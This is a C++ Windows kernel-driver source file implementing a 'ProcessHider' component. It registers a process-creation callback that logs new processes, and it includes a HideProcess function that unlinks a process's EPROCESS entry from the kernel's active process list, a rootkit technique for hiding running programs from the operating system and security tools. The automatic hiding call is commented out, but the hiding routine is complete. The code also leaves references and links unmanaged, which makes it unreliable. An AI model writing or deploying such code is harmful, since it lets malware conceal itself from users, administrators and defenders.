#include "ProcessHider.h"

#include <ntddk.h>

#pragma warning( disable : 4302 4311 )

namespace filter
{

	NTSTATUS ProcessHider::Register()
	{
		ProcessHider::HideOnInitializeOperation();
		NTSTATUS status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, FALSE);

		if (!NT_SUCCESS(status)) 
		{
			ProcessHider::Unload();
		}
		return status;
	}

	void ProcessHider::HideOnInitializeOperation()
	{
		
	}

	void ProcessHider::HideOnCreateOperation(P_CUSTOM_EPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO create_info)
	{
		UNREFERENCED_PARAMETER(process);
		WCHAR msg[500] = { 0 };
		WCHAR name[500] = { 0 };

		DebugMessage("Process created with PID %d", (int)pid);

		if (create_info!=NULL)
		{
			PUNICODE_STRING process_name = NULL;

			DebugMessage("Process created with PID %d and name %wZ", (int)pid, create_info->ImageFileName);

			/*

			if (PsLookupProcessByProcessId(pid, &process) != STATUS_SUCCESS)
			{
				return;
			}

			if (SeLocateProcessImageName(process, &process_name) != STATUS_SUCCESS)
			{
				return;
			}

			
			int size = process_name->Length / 2;
			int ans = -1;
			for (int i = size - 1; i >= 0; i--)
			{
				if (process_name->Buffer[i] == WCHAR(L'\\'))
				{
					ans = i;
					break;
				}
			}

			int mem_size = (size - (ans+1)) * 2;
			RtlCopyMemory(name, &process_name->Buffer[ans+1], mem_size);
			DebugMessage("Process created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);

			if (HideProcess(pid) == true)
			{
				DebugMessage("Hide oke");
			}
			
			ExFreePool(process_name->Buffer);
			*/
		}
	}

	void ProcessHider::Unload()
	{
		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, TRUE);
	}

	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
	{
		return false;
	}

	bool ProcessHider::HideProcess(HANDLE pid)
	{

		PEPROCESS p_eprocess;
		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;
		NTSTATUS status = PsLookupProcessByProcessId(
			pid,
			&p_eprocess
		);

		if (status == STATUS_SUCCESS)
		{
			KIRQL  new_irql = DISPATCH_LEVEL;
			KIRQL old_irql = DISPATCH_LEVEL;
			KeRaiseIrql(new_irql, &old_irql);

			cur_p_eprocess = (P_CUSTOM_EPROCESS)(PVOID)p_eprocess;

			pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
			next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
			pre_p_eprocess = CONTAINING_RECORD(pre_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
			pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
			next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
			KeLowerIrql(old_irql);

			return true;
		}
		return false;
	}

}
